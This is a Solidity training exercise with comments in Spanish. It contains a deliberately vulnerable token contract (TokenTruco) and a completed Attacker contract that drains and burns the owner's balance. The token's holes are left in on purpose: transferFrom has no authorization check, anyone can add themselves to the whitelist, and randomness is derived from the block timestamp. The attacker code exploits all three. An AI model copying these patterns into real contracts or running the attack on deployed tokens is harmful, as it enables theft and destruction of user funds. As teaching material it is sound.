// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * En ese desafío se hará práctica de la interacción entre contratos.
 * Ello implica definir una interfaz e instanciar el contrato a interactuar.
 *
 * El objetivo final para pasar este desafío es dejar al owner de SimpleToken
 * con un balance de 0 cuando se revisa el mapping 'balances'.
 *
 * Este cometido debe ser logrado llamando el método 'ejecutarAtaque' del contrato Attacker.
 * Dentro de este éste método se deben realizar todas las operaciones necesarias para
 * dejar al owner de SimpleToken con un balance de 0.
 *
 * El método 'ejecutarAtaque' debe realizar las siguientes tareas:
 * - Calcular un monton aleatorio usando el método 'montoAleatorio' de SimpleToken
 * - Transferir el monto aleatorio a la cuenta del atacante usando el método 'transferFrom' de SimpleToken
 * - Agregar la cuenta del atacante a la whitelist usando el método 'addToWhitelist' de SimpleToken
 * - Calcular el restante en la cuenta del owner para quemarlo usando el metodo 'burn' de SimpleToken
 *
 * Para ejecutar este desafío correr el comando:
 * $ npx hardhat test test/EjercicioTesting_6.js
 */

// NO MODIFICAR
contract NumeroRandom {
    function montoAleatorio() public view returns (uint256) {
        return
            (uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) %
                1000000) + 1;
    }
}

// NO MODIFICAR
contract Whitelist {
    mapping(address => bool) public whitelist;

    modifier onlyWhiteList() {
        require(whitelist[msg.sender] == true);
        _;
    }

    function _addToWhitelist(address _account) internal {
        whitelist[_account] = true;
    }
}

// NO MODIFICAR EL CONTRATO TokenTruco
contract TokenTruco is Whitelist, NumeroRandom {
    address public owner;

    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
        balances[msg.sender] = 1000000;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public {
        balances[_from] -= _amount;
        balances[_to] += _amount;
    }

    function burn(address _from, uint256 _amount) public onlyWhiteList {
        // msg.sender == contrato Attacker
        balances[_from] -= _amount;
    }

    function addToWhitelist() public {
        _addToWhitelist(msg.sender);
    }
}

// Deducir la interface y los métodos que se usarán
// Mediante ITokenTruco el contrato Attacker ejecutará el ataque
// interface ITokenTruco {
//     function owner() external view returns (address);

//     function balances(address _account) external view returns (uint256);

//     // function transferFrom

//     // function burn

//     // ...
// }

// // Modificar el método 'ejecutarAtaque'
// contract Attacker {
//     ITokenTruco public tokenTruco;

//     constructor(address _tokenTrucoAddress) {
//         tokenTruco = ITokenTruco(_tokenTrucoAddress);
//     }

//     function ejecutarAtaque() public {
//         // tokenTruco ...
//     }
// }

interface ITokenTruco {
    function montoAleatorio() external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _amount) external;
    function addToWhitelist() external;
    function burn(address _from, uint256 _amount) external;
    function owner() external view returns (address);
    function balances(address _account) external view returns (uint256);
}

// Attacker contract that interacts with the TokenTruco contract
contract Attacker {
    ITokenTruco public tokenTruco;

    // Constructor to set the address of TokenTruco
    constructor(address _tokenTrucoAddress) {
        tokenTruco = ITokenTruco(_tokenTrucoAddress);
    }

    // Method to execute the attack
    function ejecutarAtaque() public {
        // Calculate a random amount to transfer using montoAleatorio from TokenTruco
        uint256 randomAmount = tokenTruco.montoAleatorio();

        // Get the owner's address from TokenTruco
        address owner = tokenTruco.owner();

        // Ensure the random amount does not exceed the current balance of the owner
        uint256 ownerBalance = tokenTruco.balances(owner);
        if (randomAmount > ownerBalance) {
            randomAmount = ownerBalance;
        }

        // Transfer the random amount from the owner to this contract
        tokenTruco.transferFrom(owner, address(this), randomAmount);

        // Add this contract to the whitelist
        tokenTruco.addToWhitelist();

        // Calculate the remaining balance of the owner to burn
        uint256 remainingBalance = tokenTruco.balances(owner);

        // Burn the remaining balance of the owner
        tokenTruco.burn(owner, remainingBalance);
    }
}